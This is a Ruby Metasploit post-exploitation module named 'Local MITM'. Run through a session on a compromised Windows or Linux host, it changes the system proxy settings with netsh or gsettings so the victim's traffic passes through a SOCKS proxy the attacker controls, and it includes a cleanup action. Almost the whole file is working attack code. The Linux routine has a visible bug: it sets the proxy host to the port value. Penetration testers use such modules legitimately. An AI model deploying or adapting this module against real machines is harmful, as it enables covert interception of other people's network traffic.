##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Linux::System
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Local MITM',
      'Description'   => %q{
        This module setup a local proxy on the victim computer so you can MITM it.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Eliott Teissonniere' ],
      'Platform'      => [ 'win', 'linux', 'unix' ],
      'SessionTypes'  => [ 'meterpreter', 'shell' ],
      'DefaultAction' => 'INSTALL',
      'Actions'       =>
        [
          [ 'INSTALL', { 'Description' => 'Install the proxy' } ],
          [ 'CLEANUP', { 'Description' => 'Remove the proxy' } ]
        ]
    ))

    register_options(
      [
        OptAddress.new('PRXHOST', [true, 'Address of the proxy server']),
        OptPort.new('PRXPORT', [true, 'Port of the proxy server'])
      ])
  end

  # Custom cmd_exec for tweaking purposes
  def vcmd_exec(cmd, check='', admin=false)
    if check != '' # For Linux / Unix
      vprint_status "Checking if #{check} is available"

      unless command_exists? check
        return print_error("#{check} is not available")
      else
        print_good("#{check} is available")
      end
    end

    if admin # For Windows
      vprint_status 'Verifying privileges'
      
      unless is_admin?
        return print_error('Administrator or better privileges needed. Try "getsystem" first.')
      else
        print_good('Administrator or better privileges detected')
      end
    end

    vprint_status "Executing #{cmd}"
    out = cmd_exec(cmd)
    vprint_status out

    return out
  end

  def win_install
    vcmd_exec("netsh winhttp set proxy proxy-server=\"socks=#{datastore["PRXHOST"]}:#{datastore["PRXPORT"]}\" bypass-list=\"<local>\"", '', true)
  end

  def win_clean
    vcmd_exec('netsh winhttp reset proxy', '', true)
  end

  def linux_install
    vcmd_exec("gsettings set org.gnome.system.proxy mode 'manual'", 'gsettings') # tell NetworkManager there is a proxy
    vcmd_exec("gsettings set org.gnome.system.proxy.socks port #{datastore["PRXPORT"]}", 'gsettings')
    vcmd_exec("gsettings set org.gnome.system.proxy.socks host #{datastore["PRXPORT"]}", 'gsettings')
    vcmd_exec("gsettings set org.gnome.system.proxy ignore-hosts \"['localhost', '127.0.0.0/8', '::1']\"")
  end

  def linux_clean
    vcmd_exec('gsettings set org.gnome.system.proxy mode "none"', 'gsettings')
  end

  def install_proxy
    print_status('Installing new proxy')

    case session.platform
      when 'windows'
        return win_install
      when 'linux', 'unix'
        return linux_install
    end

    return print_error('Unsupported platform')
  end

  def cleanup_proxy
    print_status('Cleaning up proxy settings')

    case session.platform
      when 'windows'
        return win_clean
      when 'linux', 'unix'
        return linux_clean
    end

    return print_error('Unsupported platform')
  end

  def run
    case action.name
      when 'INSTALL'
        return install_proxy
      when 'CLEANUP'
        return cleanup_proxy
    end

    print_error('Please specify a valid action')
  end
end
